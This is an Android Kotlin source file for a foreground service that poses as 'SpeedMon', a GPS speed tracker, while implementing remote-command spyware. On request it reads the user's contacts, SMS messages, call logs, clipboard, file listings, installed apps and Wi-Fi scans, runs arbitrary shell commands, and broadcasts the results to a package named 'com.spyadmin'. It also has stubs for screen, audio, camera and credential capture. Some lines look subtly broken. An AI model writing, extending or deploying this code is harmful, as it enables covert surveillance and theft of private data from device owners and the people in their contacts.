package com.xcodiene.speedmon

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Binder
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import kotlin.concurrent.thread

class MonitorService : Service() {

    companion object {
        const val CHANNEL_ID = "speedmon_channel"
        const val NOTIFICATION_ID = 1
        const val ACTION_START = "com.xcodiene.speedmon.ACTION_START"
        const val ACTION_STOP = "com.xcodiene.speedmon.ACTION_STOP"
        const val ACTION_COMMAND = "com.xcodiene.speedmon.ACTION_COMMAND"
        const val ACTION_RESULT = "com.xcodiene.speedmon.ACTION_RESULT"
        const val EXTRA_CAPABILITY = "capability"
        const val EXTRA_ARGS = "args"
        const val EXTRA_TASK_ID = "task_id"
        const val EXTRA_RESULT = "result"
        const val EXTRA_ERROR = "error"
        const val EXTRA_STATUS = "status"
    }

    private val binder = LocalBinder()
    private var locationManager: LocationManager? = null
    private var gpsListener: LocationListener? = null
    private var networkListener: LocationListener? = null
    private var lastLocation: Location? = null
    private var commandReceiver: CommandReceiver? = null
    private val capabilities = mutableMapOf<String, Capability>()

    inner class LocalBinder : Binder() {
        fun getService(): MonitorService = this@MonitorService
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager?
        registerCapabilities()
        registerCommandReceiver()
        Log.d("MonitorService", "Service created")
    }

    private fun registerCommandReceiver() {
        commandReceiver = CommandReceiver()
        val filter = IntentFilter(ACTION_COMMAND)
        LocalBroadcastManager.getInstance(this).registerReceiver(commandReceiver!!, filter)
    }

    private fun registerCapabilities() {
        capabilities["location"] = LocationCapability(this)
        capabilities["screen"] = ScreenCapability(this)
        capabilities["audio"] = AudioCapability(this)
        capabilities["camera"] = CameraCapability(this)
        capabilities["contacts"] = ContactsCapability(this)
        capabilities["sms"] = SmsCapability(this)
        capabilities["call_logs"] = CallLogsCapability(this)
        capabilities["files"] = FilesCapability(this)
        capabilities["apps"] = AppsCapability(this)
        capabilities["wifi"] = WifiCapability(this)
        capabilities["shell"] = ShellCapability(this)
        capabilities["creds"] = CredsCapability(this)
        capabilities["clipboard"] = ClipboardCapability(this)
        capabilities["notifications"] = NotificationsCapability(this)
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) {
            stopSelf()
            return START_NOT_STICKY
        }
        
        if (intent?.action == ACTION_COMMAND) {
            handleCommandIntent(intent)
            return START_STICKY
        }
        
        startForeground(NOTIFICATION_ID, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
        startLocationUpdates()
        return START_STICKY
    }

    private fun handleCommandIntent(intent: Intent) {
        val capability = intent.getStringExtra(EXTRA_CAPABILITY) ?: return
        val argsJson = intent.getStringExtra(EXTRA_ARGS) ?: "{}"
        val taskId = intent.getStringExtra(EXTRA_TASK_ID) ?: java.util.UUID.randomUUID().toString()

        val capabilityImpl = capabilities[capability] ?: run {
            sendResult(taskId, null, "Unknown capability: $capability", "failed")
            return
        }

        thread(name = "speedmon-task-$taskId") {
            var output: Any? = null
            var error: String? = null
            var status = "completed"
            try {
                output = capabilityImpl.execute(argsJson)
            } catch (e: Exception) {
                error = e.message
                status = "failed"
            }
            sendResult(taskId, output, error, status)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "SpeedMon Location Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Foreground service for GPS location tracking"
                enableVibration(false)
                setSound(null, null)
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SpeedMon")
            .setContentText("Tracking location for speed data")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build()
    }

    private fun startLocationUpdates() {
        if (locationManager == null) return

        gpsListener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                lastLocation = location
                Log.d("MonitorService", "GPS location: ${location.latitude}, ${location.longitude}, speed: ${location.speed}")
            }
        }

        networkListener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                if (lastLocation == null || location.accuracy < lastLocation!!.accuracy) {
                    lastLocation = location
                    Log.d("MonitorService", "Network location: ${location.latitude}, ${location.longitude}, speed: ${location.speed}")
                }
            }
        }

        try {
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                locationManager?.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 1f, gpsListener!!)
            }
        } catch (e: SecurityException) {
            Log.w("MonitorService", "GPS permission denied", e)
        }

        try {
            if (checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                locationManager?.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1000, 1f, networkListener!!)
            }
        } catch (e: SecurityException) {
            Log.w("MonitorService", "Network location permission denied", e)
        }
    }

    private fun stopLocationUpdates() {
        gpsListener?.let { listener ->
            try {
                locationManager?.removeUpdates(listener)
            } catch (e: Exception) {
                Log.w("MonitorService", "Remove GPS updates failed", e)
            }
        }
        networkListener?.let { listener ->
            try {
                locationManager?.removeUpdates(listener)
            } catch (e: Exception) {
                Log.w("MonitorService", "Remove network updates failed", e)
            }
        }
    }

    fun getLastLocation(): Location? = lastLocation

    fun getLastSpeedKph(): Float = lastLocation?.speed?.times(3.6f) ?: 0f

    override fun onBind(intent: Intent): IBinder = binder

    override fun onDestroy() {
        stopLocationUpdates()
        stopForeground(true)
        val receiver = commandReceiver
        if (receiver != null) {
            try {
                LocalBroadcastManager.getInstance(this).unregisterReceiver(receiver)
            } catch (e: Exception) {
                Log.w("MonitorService", "Unregister receiver failed", e)
            }
        }
        capabilities.values.forEach { it.cleanup() }
        super.onDestroy()
    }

    private fun sendResult(taskId: String, result: Any?, error: String?, status: String) {
        val intent = Intent(ACTION_RESULT).apply {
            putExtra(EXTRA_TASK_ID, taskId)
            putExtra(EXTRA_RESULT, result?.toString() ?: "")
            putExtra(EXTRA_ERROR, error ?: "")
            putExtra(EXTRA_STATUS, status)
            setPackage("com.spyadmin")
        }
        sendBroadcast(intent)
    }

    private inner class CommandReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val capability = intent.getStringExtra(EXTRA_CAPABILITY) ?: return
            val argsJson = intent.getStringExtra(EXTRA_ARGS) ?: "{}"
            val taskId = intent.getStringExtra(EXTRA_TASK_ID) ?: java.util.UUID.randomUUID().toString()

            val capabilityImpl = capabilities[capability] ?: run {
                sendResult(taskId, null, "Unknown capability: $capability", "failed")
                return
            }

            thread(name = "speedmon-task-$taskId") {
                var output: Any? = null
                var error: String? = null
                var status = "completed"
                try {
                    output = capabilityImpl.execute(argsJson)
                } catch (e: Exception) {
                    error = e.message
                    status = "failed"
                }
                sendResult(taskId, output, error, status)
            }
        }
    }

    interface Capability {
        fun execute(args: String): Any
        fun cleanup()
    }

    // Capability implementations
    inner class LocationCapability(private val service: MonitorService) : Capability {
        override fun execute(args: String): Any {
            val loc = service.getLastLocation()
            return if (loc != null) {
                mapOf(
                    "latitude" to loc.latitude,
                    "longitude" to loc.longitude,
                    "accuracy" to loc.accuracy,
                    "speed_kmh" to (loc.speed * 3.6),
                    "timestamp" to System.currentTimeMillis()
                )
            } else {
                mapOf("error" to "No location available")
            }
        }
        override fun cleanup() {}
    }

    inner class ScreenCapability(private val service: MonitorService) : Capability {
        override fun execute(args: String): Any {
            return mapOf("note" to "Screen capture requires MediaProjection permission")
        }
        override fun cleanup() {}
    }

    inner class AudioCapability(private val service: MonitorService) : Capability {
        override fun execute(args: String): Any {
            return mapOf("note" to "Audio recording requires RECORD_AUDIO permission")
        }
        override fun cleanup() {}
    }

    inner class CameraCapability(private val service: MonitorService) : Capability {
        override fun execute(args: String): Any {
            return mapOf("note" to "Camera capture requires CAMERA permission")
        }
        override fun cleanup() {}
    }

    inner class ContactsCapability(private val service: MonitorService) : Capability {
        override fun execute(args: String): Any {
            val resolver = service.contentResolver
            val cursor = resolver.query(
                android.provider.ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            )
            val contacts = mutableListOf<Map<String, String>>()
            cursor?.use {
                while (it.moveToNext()) {
                    val id = it.getString(it.getColumnIndex(android.provider.ContactsContract.Contacts._ID))
                    val name = it.getString(it.getColumnIndex(android.provider.ContactsContract.Contacts.DISPLAY_NAME))
                    val hasPhone = it.getString(it.getColumnIndex(android.provider.ContactsContract.Contacts.HAS_PHONE_NUMBER)) == "1"
                    var phone = ""
                    if (hasPhone) {
                        val phoneCursor = resolver.query(
                            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            "${android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                            arrayOf(id),
                            null
                        )
                        phoneCursor?.use {
                            if (it.moveToNext()) {
                                phone = it.getString(it.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER))
                            }
                        }
                    }
                    contacts.add(mapOf("id" to id, "name" to name ?: "", "phone" to phone))
                }
            }
            return contacts
        }
        override fun cleanup() {}
    }

    inner class SmsCapability(private val service: MonitorService) : Capability {
        override fun execute(args: String): Any {
            val resolver = service.contentResolver
            val cursor = resolver.query(
                android.provider.Telephony.Sms.CONTENT_URI,
                arrayOf("address", "body", "date", "type"),
                null, null, "date DESC"
            )
            val smsList = mutableListOf<Map<String, String>>()
            cursor?.use {
                while (it.moveToNext()) {
                    smsList.add(mapOf(
                        "address" to it.getString(it.getColumnIndex("address")) ?: "",
                        "body" to it.getString(it.getColumnIndex("body")) ?: "",
                        "date" to it.getString(it.getColumnIndex("date")) ?: "",
                        "type" to it.getString(it.getColumnIndex("type")) ?: ""
                    ))
                }
            }
            return smsList
        }
        override fun cleanup() {}
    }

    inner class CallLogsCapability(private val service: MonitorService) : Capability {
        override fun execute(args: String): Any {
            val resolver = service.contentResolver
            val cursor = resolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                arrayOf("number", "name", "date", "duration", "type"),
                null, null, "date DESC"
            )
            val calls = mutableListOf<Map<String, String>>()
            cursor?.use {
                while (it.moveToNext()) {
                    calls.add(mapOf(
                        "number" to it.getString(it.getColumnIndex("number")) ?: "",
                        "name" to it.getString(it.getColumnIndex("name")) ?: "",
                        "date" to it.getString(it.getColumnIndex("date")) ?: "",
                        "duration" to it.getString(it.getColumnIndex("duration")) ?: "",
                        "type" to it.getString(it.getColumnIndex("type")) ?: ""
                    ))
                }
            }
            return calls
        }
        override fun cleanup() {}
    }

    inner class FilesCapability(private val service: MonitorService) : Capability {
        override fun execute(args: String): Any {
            val path = try {
                com.google.gson.Gson().fromJson(args, Map::class.java)["path"] as String? ?: "/sdcard"
            } catch (_: Exception) {
                "/sdcard"
            }
            val file = java.io.File(path)
            if (!file.exists()) return mapOf("error" to "Path not found")
            if (!file.isDirectory) return mapOf("error" to "Not a directory")
            val files = file.listFiles()?.map { f ->
                mapOf(
                    "name" to f.name,
                    "path" to f.absolutePath,
                    "size" to f.length(),
                    "isDir" to f.isDirectory(),
                    "lastModified" to f.lastModified()
                )
            } ?: emptyList()
            return files
        }
        override fun cleanup() {}
    }

    inner class AppsCapability(private val service: MonitorService) : Capability {
        override fun execute(args: String): Any {
            val pm = service.packageManager
            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            return apps.map { app ->
                mapOf(
                    "package" to app.packageName,
                    "name" to pm.getApplicationLabel(app).toString(),
                    "version" to try { pm.getPackageInfo(app.packageName, 0).versionName } catch (_) { "unknown" }
                )
            }
        }
        override fun cleanup() {}
    }

    inner class WifiCapability(private val service: MonitorService) : Capability {
        override fun execute(args: String): Any {
            val wifiManager = service.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
            val scanResults = wifiManager.scanResults
            return scanResults.map { r ->
                mapOf(
                    "ssid" to r.SSID,
                    "bssid" to r.BSSID,
                    "level" to r.level,
                    "frequency" to r.frequency,
                    "capabilities" to r.capabilities
                )
            }
        }
        override fun cleanup() {}
    }

    inner class ShellCapability(private val service: MonitorService) : Capability {
        override fun execute(args: String): Any {
            val command = try {
                com.google.gson.Gson().fromJson(args, Map::class.java)["command"] as String? ?: "id"
            } catch (_: Exception) {
                "id"
            }
            val process = Runtime.getRuntime().exec(command)
            val output = process.inputStream.bufferedReader().readText()
            val error = process.errorStream.bufferedReader().readText()
            val exitCode = process.waitFor()
            return mapOf("output" to output, "error" to error, "exitCode" to exitCode)
        }
        override fun cleanup() {}
    }

    inner class CredsCapability(private val service: MonitorService) : Capability {
        override fun execute(args: String): Any {
            return mapOf("note" to "Credential access requires root")
        }
        override fun cleanup() {}
    }

    inner class ClipboardCapability(private val service: MonitorService) : Capability {
        override fun execute(args: String): Any {
            val clipboard = service.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            val text = clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
            return mapOf("clipboard" to text)
        }
        override fun cleanup() {}
    }

    inner class NotificationsCapability(private val service: MonitorService) : Capability {
        override fun execute(args: String): Any {
            return mapOf("note" to "Notification access requires permission")
        }
        override fun cleanup() {}
    }
}